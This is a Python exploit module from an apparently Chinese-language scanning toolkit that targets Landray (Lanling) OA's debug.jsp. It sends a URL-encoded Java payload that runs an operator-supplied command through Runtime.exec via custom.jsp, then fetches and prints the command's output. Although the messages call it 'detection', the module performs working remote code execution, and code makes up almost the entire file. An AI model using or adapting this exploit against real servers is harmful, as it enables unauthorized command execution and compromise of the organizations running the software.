#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import requests
import urllib3
from libs.public.outprint import OutPrintInfo
from libs.public.reqset import ReqSet

urllib3.disable_warnings()


class LanlingDebugRceScan:
    def __init__(self):
        self.header = None
        self.proxy = None
        self.ssl = None

    def run(self, url, data):
        header = {
            'User-Agent': self.header,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept-Encoding': 'gzip'
        }
        try:
            response = requests.post(url, headers=header, data=data, timeout=5, verify=self.ssl, proxies=self.proxy)
            response.encoding = response.apparent_encoding
            if response.status_code == 200:
                data2 = 'var={"body":{"file":"/sys/common/code.jsp"}}'
                response2 = requests.post(url, headers=header, data=data2, timeout=5, verify=self.ssl,
                                          proxies=self.proxy)
                response2.encoding = response2.apparent_encoding
                if '======>>>' in response2.text:
                    OutPrintInfo("LanLing", f"蓝凌Lanling-debug.jsp代码执行[b red]{url}[/b red]")
                    OutPrintInfo("LanLing", "请求体:")
                    print(response2.text)
                else:
                    OutPrintInfo("LanLing", "目标不存在该漏洞")
            else:
                OutPrintInfo("LanLing", "目标不存在该漏洞")
        except Exception:
            OutPrintInfo("LanLing", "目标不存在该漏洞")

    def main(self, results):
        url = results[0].strip('/ ')
        cmd = results[1]
        self.ssl = results[2]
        self.header = results[3]
        proxy = results[4]
        reqset = ReqSet(proxy=proxy)
        self.proxy = reqset["proxy"]
        # threads = int(results[-1])
        OutPrintInfo("LanLing", "开始检测蓝凌Lanling-debug.jsp代码执行......")
        new_url = url + "/sys/ui/extend/varkind/custom.jsp"
        cmds2 = f"try+%7B%0D%0AProcess+p%3B%0D%0Ap+%3D+Runtime.getRuntime%28%29.exec%28%22{cmd}%22%29%3B%0D%0Aout.println%28%22%3D%3D%3D%3D%3D%3D%3E%3E%3E%22%29%3B%0D%0AString+fileContent+%3D+null%3B++++++++%0D%0Abyte%5B%5D+buf+%3D+new+byte%5B1024%5D%3B%0D%0Aint+readLen+%3D+0%3B%0D%0Awhile%28%28readLen+%3D+p.getInputStream%28%29.read%28buf%29%29%21%3D-1%29+%7B%0D%0A++++++++++++++++fileContent+%2B%3D+%28new+String%28buf%2C+0%2C+readLen%29%29%3B%0D%0A++++++++++++%7D%0D%0Aout.println%28fileContent%2B%22%5CnPocman%22%29%3B%0D%0A%7D%0D%0Acatch+%28Exception+e%29+%0D%0A%7B%0D%0Ae.printStackTrace%28%29%3B%0D%0A%7D"
        data = 'var={"body":{"file":"/sys/common/debug.jsp"}}&fdCode=' + cmds2

        self.run(new_url, data)

        OutPrintInfo("LanLing", "蓝凌Lanling-debug.jsp代码执行检测结束")
